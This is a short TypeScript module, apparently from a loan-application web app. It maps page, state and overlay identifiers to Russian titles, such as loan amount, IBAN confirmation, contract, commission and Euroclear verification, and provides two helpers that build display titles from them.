const pageTitles: Record<string, string> = {
  home: 'Главная',
  amount: 'Сумма и срок кредита',
  personal: 'Личные данные',
  check: 'Проверка банков',
  approved: 'Одобренное предложение',
  register: 'Регистрация',
  login: 'Вход',
  profile: 'Профиль',
  documents: 'Документы',
  iban: 'Подтверждение IBAN',
  contract: 'Договор и подпись',
  withdrawal: 'Получение средств',
  commission: 'Комиссия',
  transfer: 'Перевод',
  certificate: 'Сертификат CPI',
  verification: 'Проверка Euroclear',
  assistance: 'Чат поддержки',
};
const stateTitles: Record<string, string> = {
  default: 'Исходное состояние',
  certificate: 'Сертификат',
  'certificate-confirmed': 'Сертификат подтверждён',
  'certificate-ready': 'Сертификат готов',
  checking: 'Идёт проверка',
  commission: 'Комиссия',
  completed: 'Завершено',
  'completed-compact': 'Завершено · компактный вид',
  confirm: 'Подтверждение',
  conversation: 'Переписка',
  'document-menu': 'Выбор документа',
  error: 'Ошибка',
  euroclear: 'Euroclear',
  insurance: 'Страхование',
  interrupted: 'Перевод прерван',
  legacy: 'Предыдущий вариант',
  passport: 'Паспорт',
  processing: 'Обработка',
  restricted: 'Доступ ограничен',
  'restricted-processing': 'Ограничение · обработка',
  success: 'Успешно',
  verification: 'Проверка',
};
const overlayTitles: Record<string, string> = {
  chat: 'Чат',
  coordinates: 'Реквизиты',
  details: 'Подробности',
  email: 'Смена почты',
  instructions: 'Инструкция',
  name: 'Изменение имени',
  password: 'Смена пароля',
  sepa: 'SEPA',
  signature: 'Подпись',
  warning: 'Предупреждение',
};
export function pageTitle(id: string) {
  return pageTitles[id] ?? id;
}
export function scenarioTitle(state: string, overlay: string | null) {
  return [stateTitles[state] ?? state, overlay ? (overlayTitles[overlay] ?? overlay) : '']
    .filter(Boolean)
    .join(' · ');
}
